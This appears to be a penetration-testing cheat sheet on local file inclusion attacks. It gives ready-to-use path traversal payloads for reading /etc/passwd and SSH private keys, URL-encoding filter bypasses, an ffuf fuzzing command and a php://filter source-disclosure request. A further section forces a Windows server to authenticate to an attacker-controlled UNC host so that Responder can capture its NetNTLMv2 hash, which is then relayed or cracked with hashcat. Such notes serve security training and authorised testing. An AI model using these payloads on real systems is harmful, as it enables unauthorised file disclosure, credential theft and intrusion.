### <span style="color:#50FA7B">cheat sheet</span>
```bash
../../../../etc/passwd

```
### <span style="color:#50FA7B">Example to read SSH key:</span>
- By default, SSH searches for `id_rsa`, `id_ecdsa`, `id_ecdsa_sk`, `id_ed25519`, `id_ed25519_sk`, and `id_dsa`
- Use URL encoding (%2e%2e%2f for ../) to bypass simple filters.
```bash
curl http://target/index.php?page=../../../../home/user/.ssh/id_rsa

#Encoded
http://$VICTIM_IP/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Automated Scanning
ffuf -w $WORDLIST_PATH/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://$VICTIM_IP:36613/index.php?view=FUZZ' -fs 1935

# Decoder Base64 in index file:
GET /index.php?page=php://filter/read=convert.base64-encode/resource=index HTTP/1.1

```

# <span style="color:#FF5555">LFI to NetNTLMv2 leak (Windows via UNC path)</span>

If a Windows-hosted site has an LFI where you control the included path, point the include at a **UNC path** on your own box. When the server reads it, it authenticates to your SMB listener over NTLM — leaking a **NetNTLMv2 hash** you can crack or relay.

> [!info] Why it works
> Windows treats `\\host\share\file` as a network path. Forcing the web app to "include" a UNC path makes the server (as the account the web service runs under — often the machine account `HOST$` or a service account) reach out and authenticate to you.

```bash
# 1) Start a listener to catch the auth
sudo responder -I tun0
# OR relay it onward (if SMB signing not required on the target)
impacket-ntlmrelayx -smb2support -t smb://<internal-host>
```

```bash
# 2) Trigger the include with a UNC path pointing at your box
http://target/index.php?page=\\$ATTACKER_IP\share\anything

# 3) Slash variations if backslashes get filtered / don't fire
?page=//$ATTACKER_IP/share/anything
?page=%5C%5C10.10.14.5%5Cshare%5Canything
```

You'll receive a `NetNTLMv2` hash at Responder → crack it with hashcat `-m 5600`.

 